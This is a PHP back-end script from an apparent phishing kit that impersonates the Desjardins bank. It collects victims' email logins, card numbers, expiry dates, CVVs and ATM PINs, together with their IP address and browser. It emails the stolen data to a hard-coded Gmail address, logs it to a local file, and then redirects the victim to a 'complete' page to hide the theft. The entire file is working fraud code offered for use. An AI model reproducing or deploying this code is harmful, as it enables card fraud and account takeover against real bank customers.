<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 EmailDetails---------------------\n";
$message .= "EMAIL		: ".$_POST['EA']."\n";
$message .= "EPASS		: ".$_POST['EP']."\n";
$message .= "-----------------4 CardDetails----------------------\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['E1']."-".$_POST['E2']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by medpage-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------DESJARDINSResults------------------\n";
$send = "desjlolo0089@gmail.com";
$subject = "desjardinsResultz 3 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "complete.htm";

</script>
